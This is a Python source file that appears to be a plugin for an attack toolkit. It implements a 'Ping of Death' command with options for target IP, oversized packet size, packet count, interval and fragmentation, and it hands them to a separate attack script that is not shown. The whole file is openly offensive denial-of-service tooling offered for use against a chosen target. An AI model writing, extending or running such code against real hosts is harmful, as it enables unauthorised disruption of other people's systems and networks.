"""Ping of Death attack implementation"""

import argparse
import sys
import os
from typing import Optional
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class PingOfDeath(AttackBase):
    """Ping of Death attack implementation"""
    
    name = "ping-of-death"
    description = "Perform Ping of Death attack"
    
    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument('--target', required=True, help='Target IP address')
        parser.add_argument('--size', type=int, default=65500, help='Ping packet size')
        parser.add_argument('--count', type=int, default=1000, help='Number of packets to send')
        parser.add_argument('--interval', type=float, default=0.1, help='Time interval between packets (seconds)')
        parser.add_argument('--fragment', action='store_true', help='Fragment packets')
        
    def validate(self, args: argparse.Namespace) -> bool:
        if not self.validator.validate_ip(args.target):
            logger.error(f"Invalid target IP address: {args.target}")
            return False
        if args.size <= 0 or args.size > 65535:
            logger.error(f"Invalid packet size: {args.size}")
            return False
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}")
            return False
        if args.interval <= 0:
            logger.error(f"Invalid interval: {args.interval}")
            return False
        return True
        
    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        attack_path = os.path.join(scripts_dir, 'ping_of_death')
        
        sys.path.insert(0, attack_path)
        try:
            import ping_of_death as attack_script
            
            # Create attack configuration
            config = {
                'target_ip': args.target,
                'packet_size': args.size,
                'packet_count': args.count,
                'interval': args.interval,
                'fragment': args.fragment
            }
            
            # Run the attack
            logger.info(f"Running Ping of Death attack against {args.target}")
            attack_script.run_attack(config)
            
        except ImportError:
            logger.error("Failed to import Ping of Death attack script")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(attack_path)
